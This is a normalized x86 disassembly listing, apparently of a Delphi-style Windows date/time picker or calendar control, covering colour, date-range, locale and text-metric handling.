pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_43afd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
and ax 0x1fff
mov [ ebx + 0x20c ] ax
mov al [ r-xdata ]
mov [ ebx + 0x209 ] al
test si 0x2000
je r-xdata
test si 0x4000
je r-xdata
or [ ebx + 0x209 ] 0x1
test si 0x8000
je r-xdata
or [ ebx + 0x209 ] 0x2
pop esi
pop ebx
retn
or [ ebx + 0x209 ] 0x4
sub_43b020
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_406aa0
mov [ ebx + 0x209 ] al
mov eax esi
and eax 0xff
mov [ ebx + 0x20c ] ax
test [ ebx + 0x209 ] 0x1
je r-xdata
test [ ebx + 0x209 ] 0x2
je r-xdata
add ax 0x2000
test [ ebx + 0x209 ] 0x4
je r-xdata
add ax 0x4000
pop esi
pop ebx
retn
add ax 0x8000
sub_43b06c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x6 ] 0x300
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x212 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x214 ]
call [ ebx + 0x210 ]
sub_43b0a0
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xff000005
mov [ eax + 0xc ] 0xff000008
mov [ eax + 0x10 ] 0xff000002
mov [ eax + 0x14 ] 0xffffff
mov [ eax + 0x18 ] 0xffffff
mov [ eax + 0x1c ] 0xff000013
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_43b0f0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43b1e1
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404184
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fb8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030e0
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ esi + 0x18 ] edx
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b1e8
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_43b1fc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
cmp eax 0x5
ja r-xdata
mov eax [ ebx + 0x4 ]
call sub_453d8c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_43b213 ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_423580
mov ecx eax
mov edx [ esi * 4 + rw-data ]
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd8 ]
mov [ ebx + 0x8 ] edi
jmp r-xdata
mov [ ebx + 0xc ] edi
jmp r-xdata
mov [ ebx + 0x10 ] edi
jmp r-xdata
mov [ ebx + 0x14 ] edi
jmp r-xdata
mov [ ebx + 0x18 ] edi
jmp r-xdata
mov [ ebx + 0x1c ] edi
sub_43b274
push ebx
mov ebx eax
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
call sub_43b1fc
mov ecx [ ebx + 0xc ]
mov edx 0x1
mov eax ebx
call sub_43b1fc
mov ecx [ ebx + 0x10 ]
mov edx 0x2
mov eax ebx
call sub_43b1fc
mov ecx [ ebx + 0x14 ]
mov edx 0x3
mov eax ebx
call sub_43b1fc
mov ecx [ ebx + 0x18 ]
mov edx 0x4
mov eax ebx
call sub_43b1fc
mov ecx [ ebx + 0x1c ]
mov edx 0x5
mov eax ebx
call sub_43b1fc
pop ebx
retn
sub_43b2d0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x100
call sub_437d20
mov ecx esi
xor edx edx
mov eax edi
call sub_44f7b4
mov [ edi + 0x245 ] 0x1
mov [ edi + 0x246 ] 0x1
mov eax [ r-xdata ]
mov [ edi + 0x50 ] eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b0a0
mov [ edi + 0x208 ] eax
call sub_409a50
fstp [ edi + 0x210 ]
fwait
mov [ edi + 0x220 ] 0x7
mov [ edi + 0x230 ] 0x1f
mov [ edi + 0x240 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_43b36c
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44f8d8
mov eax [ esi + 0x208 ]
call sub_403190
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_43b3a0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43b4a1
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b4a8
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f44
retn
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40a710
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b8a0
call sub_40395c
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0x14 ]
call sub_40a710
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b8a0
call sub_40395c
sub_43b4b4
push ebx
mov ebx eax
mov eax ebx
call sub_450a40
mov eax [ ebx + 0x208 ]
call sub_43b274
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_43ba90
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_43b918
mov edx [ ebx + 0x240 ]
mov eax ebx
call sub_43ba54
mov dl [ ebx + 0x220 ]
mov eax ebx
call sub_43b7c4
cmp [ ebx + 0x244 ] 0x0
je r-xdata
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_43b6b4
pop ebx
retn
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_43bbe0
pop ebx
retn
sub_43b550
xor edx edx
mov dl [ eax + 0x245 ]
mov edx [ edx * 4 + rw-data ]
or edx 0x1
xor ecx ecx
mov cl [ eax + 0x246 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x247 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0x244 ]
or edx [ eax * 4 + rw-data ]
mov eax edx
retn
sub_43b5fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x214 ]
push [ eax + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_409aa0
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
xor eax eax
push ebp
push sub_43b681
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
call sub_40296c
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
fild [ ebp - 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43b6b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43b6b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409978
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_43bbe0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x214 ] eax
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_43b73c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
call sub_40296c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0x218 ]
call sub_40296c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fcomp [ ebp - 0x8 ]
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebp - 0x8 ]
fadd [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
mov eax ebx
call sub_43b5cc
add esp 0xfffffff8
fstp [ esp ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax ebx
call sub_43bbe0
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_43b7c4
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_453d8c
test al al
je r-xdata
mov [ esi + 0x220 ] bl
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x7
jne r-xdata
mov edi ebx
and edi 0x7f
push 0x2
lea eax [ esp + 0x4 ]
push eax
push 0x100c
push 0x400
call GetLocaleInfoA
movzx edi [ esp ]
sub edi 0x30
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx edi
call sub_42ade8
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
sub_43b82c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43b904
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x228 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b90b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f44
retn
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43ba90
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x228 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x22c ] eax
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0xc ]
call sub_40a710
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b8a0
call sub_40395c
sub_43b918
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_42adb8
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_43b968
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43ba40
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ba47
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f44
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_43ba90
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x238 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x23c ] eax
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40a710
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b8a0
call sub_40395c
sub_43ba54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov [ ebx + 0x240 ] esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_42adf8
sub_43ba90
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov ebx eax
xor esi esi
fld [ ebp + 0x10 ]
call sub_40296c
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
fld [ ebp + 0x8 ]
call sub_40296c
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fld [ ebx + 0x210 ]
call sub_40296c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fld [ ebx + 0x218 ]
call sub_40296c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
je r-xdata
cmp [ ebp - 0x18 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43b5fc
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea ecx [ ebp - 0x40 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
jne r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43b5fc
jmp r-xdata
or esi 0x1
fild [ ebp - 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x40 ]
call sub_409978
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43b73c
jmp r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
or esi 0x2
fild [ ebp - 0x20 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x30 ]
call sub_409978
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43b73c
jmp r-xdata
sub_43bbe0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
call sub_409978
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409978
mov eax ebx
call sub_453d8c
test al al
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43b6b4
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x214 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x218 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x21c ] eax
mov eax ebx
call sub_453a88
lea edx [ ebp - 0x20 ]
call sub_42add0
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_43bc90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
mov [ esi + 0x20c ] eax
mov [ esi + 0x251 ] 0x0
xor edx edx
mov eax esi
call sub_43b2d0
push [ esi + 0x214 ]
push [ esi + 0x210 ]
lea eax [ esi + 0x258 ]
call sub_409978
mov [ esi + 0x269 ] 0x0
mov [ esi + 0x252 ] 0x1
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xff000005
mov eax esi
call sub_44d32c
xor edx edx
mov eax esi
call sub_44d350
mov dl 0x1
mov eax esi
call sub_453cbc
mov edx 0xba
mov eax esi
call sub_44c948
mov eax esi
call sub_43bd60
mov [ esi + 0x250 ] 0x0
mov [ esi + 0x253 ] 0x0
mov [ esi + 0x254 ] 0x0
mov [ esi + 0x256 ] 0x0
mov [ esi + 0x268 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_43bd60
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43bdd6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_423a54
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov ebx eax
lea eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsA
push ebx
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bddd
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_43be2c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
mov edx edi
mov eax ebp
call sub_450914
mov ecx r-xdata
mov edx edi
mov eax ebp
call sub_450840
cmp [ ebp + 0x254 ] 0x1
jne r-xdata
cmp [ ebp + 0x256 ] 0x1
jne r-xdata
or [ edi + 0x4 ] 0x1
xor eax eax
mov al [ ebp + 0x253 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
or [ edi + 0x4 ] 0x9
jmp r-xdata
cmp bl 0x1
jne r-xdata
test bl bl
jne r-xdata
mov bl [ ebp + 0x250 ]
mov eax ebp
mov si 0xffc8
call sub_40338c
test al al
je r-xdata
cmp [ ebp + 0x268 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x20
xor ebx ebx
mov bl 0x1
jmp r-xdata
cmp [ ebp + 0x269 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x10
and [ edi + 0x24 ] 0xfffffffc
pop ebp
pop edi
pop esi
pop ebx
retn
or [ edi + 0x4 ] 0x2
sub_43bef8
push ebx
mov ebx eax
mov eax ebx
call sub_43b4b4
mov dl [ ebx + 0x252 ]
mov eax ebx
call sub_43c314
mov eax [ ebx + 0x290 ]
call sub_4041e0
test eax eax
jle r-xdata
pop ebx
retn
mov eax [ ebx + 0x290 ]
call sub_4043e0
push eax
push 0x0
push 0x1005
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_43bf60
push ebx
mov ebx eax
mov eax ebx
call sub_452fe4
mov eax ebx
call sub_43bd60
push 0xffffffff
push 0x0
mov eax ebx
call sub_453a88
push eax
call InvalidateRect
pop ebx
retn
sub_43bf84
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov esi eax
xor eax eax
push ebp
push sub_43c196
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx + 0x8 ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov eax [ eax + 0x8 ]
sub eax 0xfffffd09
je r-xdata
mov ebx [ edx + 0x8 ]
cmp [ esi + 0x255 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ esi + 0x269 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ edx + 0x8 ]
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0xc ]
call sub_404118
mov eax [ ebp - 0x10 ]
call sub_40af9c
fstp [ ebp - 0x8 ]
fwait
cmp [ esi + 0x272 ] 0x0
je r-xdata
sub eax 0x4
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
lea eax [ ebx + 0x10 ]
call sub_43bc80
test al al
je r-xdata
push esi
lea edi [ esi + 0x258 ]
lea esi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea eax [ esi + 0x258 ]
call sub_4099b8
fstp [ esi + 0x210 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx [ ebx + 0xc ]
call sub_404118
mov ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ esi + 0x274 ]
call [ esi + 0x270 ]
mov al [ ebp - 0x9 ]
xor al 0x1
and eax 0x7f
mov [ ebx + 0x20 ] eax
jmp r-xdata
mov eax esi
call sub_43b5cc
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ esi + 0x258 ]
call sub_409978
mov [ esi + 0x255 ] 0x1
cmp [ esi + 0x28a ] 0x0
je r-xdata
dec eax
jne r-xdata
mov eax esi
mov si 0xffb3
call sub_40338c
jmp r-xdata
push esi
lea edi [ esi + 0x258 ]
lea esi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea eax [ ebx + 0x10 ]
call sub_4099b8
fstp [ ebp - 0x8 ]
fwait
cmp [ esi + 0x256 ] 0x0
jne r-xdata
mov [ esi + 0x252 ] 0x0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c19d
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f44
retn
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_409978
jmp r-xdata
mov edx esi
mov eax [ esi + 0x28c ]
call [ esi + 0x288 ]
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esi + 0x255 ] 0x0
lea eax [ esi + 0x258 ]
call sub_4099b8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_43b5fc
cmp [ esi + 0x27a ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax esi
call sub_43c3d8
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax esi
call sub_43b5fc
jmp r-xdata
mov edx esi
mov eax [ esi + 0x27c ]
call [ esi + 0x278 ]
jmp r-xdata
mov [ esi + 0x252 ] 0x1
cmp [ esi + 0x269 ] 0x0
je r-xdata
sub_43c1d4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_453d8c
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_453a88
mov ecx ebp
mov edx edi
call sub_42ae40
cmp eax 0xffffffff
setne bl
sub_43c208
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi edx
lea edi [ ebp - 0x16 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_453d8c
test al al
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x251 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x251 ] 0x1
xor eax eax
push ebp
push sub_43c2a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_453a88
lea ecx [ ebp - 0x16 ]
xor edx edx
call sub_42ae08
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x251 ] 0x0
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x252 ] dl
sub_43c2b4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_453d8c
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
mov eax esi
call sub_453a88
mov ecx ebp
mov edx edi
